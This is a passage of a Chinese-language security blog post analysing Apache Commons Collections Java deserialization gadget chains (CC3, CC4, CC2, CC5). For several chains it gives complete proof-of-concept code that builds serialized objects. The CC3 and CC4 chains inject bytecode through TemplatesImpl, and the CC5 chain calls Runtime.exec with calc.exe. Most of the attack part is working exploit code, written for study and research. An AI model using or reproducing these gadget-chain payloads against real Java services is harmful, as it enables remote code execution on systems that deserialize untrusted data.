oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比分析Ysoserial</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519225316834.png" alt="image-20240519225316834"></p><p>这里有些许不同, 它使用了<code>InstantiateTransformer</code>而不是<code>InvokerTransformer</code>来调用<code>newTransformer</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519231447711.png" alt="image-20240519231447711"></p><p>可以看见<code>InstantiateTransformer</code>是用来调用构造函数的, 而不是<code>InvokerTransformer</code>那样执行任意方法</p><p>我们再看<code>TrAXFilter</code>这个类, 它的构造函数中正好调用了<code>templates.newTransformer()</code>方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519231136720.png" alt="image-20240519231136720"></p><p>因此即可触发cc3链条</p><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>CC4是在CC3的基础上, 前半段不动, 在调用ChainedTransformer的transform方法上有所不同</p><p> 之前的CC1,CC6都是从<code>LazyMap</code>或<code>TransformedMap</code>的get方法去调用transform, 这里CC4使用了其他的链子</p><h2 id="依赖调整"><a href="#依赖调整" class="headerlink" title="依赖调整"></a>依赖调整</h2><p>首先我们需要修改CC4依赖为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>然后在maven中下载依赖的源码, 否则不能调试</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520193836140.png" alt="image-20240520193836140"></p><p>下载好后随便打开一个类看见是.java文件就行了</p><h2 id="链子分析-3"><a href="#链子分析-3" class="headerlink" title="链子分析"></a>链子分析</h2><blockquote><p>因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 不再继承 Serializable，导致无法序列化。<br>同时 CommonsCollections 4的版本 TransformingComparator 继承了 Serializable接口，而CommonsCollections 3里是没有的。这个就提供了一个攻击的路径</p></blockquote><p>先来看看CC4的调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">    PriorityQueue.heapify()  </span></span><br><span class="line"><span class="comment">        PriorityQueue.siftDown()</span></span><br><span class="line"><span class="comment">            PriorityQueue.siftDownUsingComparator()</span></span><br><span class="line"><span class="comment">                TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">                    ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                        InstantiateTransformer.transform()</span></span><br><span class="line"><span class="comment">                            TemplatesImpl.newTransformer()</span></span><br><span class="line"><span class="comment">                                defineClass()-&gt;newInstance()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>CC4依然使用<code>ChainedTransformer</code>, 不同的是谁来调用<code>ChainedTransformer</code>的<code>transform</code></p><p>我们进入<code>TransformingComparator</code>这个类, 可以看见compare方法中调用了transform</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520194949703.png" alt="image-20240520194949694"></p><p>它的构造函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520195156711.png" alt="image-20240520195156711"></p><p>这使得我们可以调用任意类的transform方法, 再看谁调用了compare</p><p>在PriorityQueue这个类的siftDownUsingComparator中调用了compare</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200620860.png" alt="image-20240520200620860"></p><p>再看谁调用了siftDownUsingComparator</p><p>答案是siftDown</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200709787.png" alt="image-20240520200709787"></p><p>继续</p><p><code>heapify</code>调用了siftDown</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200752572.png" alt="image-20240520200752572"></p><p>正好在这个类的ReadObject方法中调用了heapify</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200852008.png" alt="image-20240520200852008"></p><p>最终poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);</span></span><br><span class="line"><span class="comment">//        name.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        name.set(templates, &quot;n4c1&quot;);</span></span><br><span class="line"><span class="comment">//        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;));</span></span><br><span class="line"><span class="comment">//        byte[][] codes=&#123;code&#125;;</span></span><br><span class="line"><span class="comment">//        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);</span></span><br><span class="line"><span class="comment">//        bytecodes.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        bytecodes.set(templates, codes);</span></span><br><span class="line"><span class="comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line"><span class="comment">//        // templates.newTransformer();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Transformer[] transformers=new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(TrAXFilter.class),</span></span><br><span class="line"><span class="comment">//                new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;templates&#125;)</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));</span></span><br><span class="line"><span class="comment">//        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);</span></span><br><span class="line"><span class="comment">//        priorityQueue.add(1);</span></span><br><span class="line"><span class="comment">//        priorityQueue.add(2);</span></span><br><span class="line"><span class="comment">//        Field transformer = TransformingComparator.class.getDeclaredField(&quot;transformer&quot;);</span></span><br><span class="line"><span class="comment">//        transformer.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        transformer.set(transformingComparator, chainedTransformer);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;CC4.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC4.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520204438735.png" alt="image-20240520204438735"></p><p>完美运行</p><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>CC2与CC4不同的地方就是后半些许不同，没有用chainedtrainsform，直接用invokertransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>偷个懒</p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>CC5实际上是在CC6的基础上做出了一点点的修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requires:</span></span><br><span class="line"><span class="comment">commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>不同之处在于CC6中的AnnotationInvocationHandler换成了BadAttributeValueExpException这个类</p><p>这里调用了toString方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520223614259.png" alt="image-20240520223614259"></p><p>转到TiedMapEntry类, 它的toString方法中调用了getValue, 这和之前的链子就串联起来了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520224014621.png" alt="image-20240520224014621"></p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;CC5.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span 